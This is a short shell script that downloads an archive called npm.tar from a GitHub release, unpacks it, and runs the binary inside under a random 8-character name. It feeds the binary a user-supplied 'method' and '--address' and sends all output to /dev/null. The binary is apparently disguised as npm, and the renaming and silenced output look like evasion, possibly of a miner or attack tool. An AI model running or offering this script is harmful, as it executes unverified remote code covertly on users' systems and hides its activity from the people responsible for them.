wget https://github.com/jaryac/binsen/releases/download/v0.1.1/npm.tar
tar -xf npm.tar
rm -rf npm.tar
read -p "methode: " METHOD
read -p "point: " POINT
variable5=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv npm $variable5
./$variable5 $METHOD --address $POINT > /dev/null 2>&1
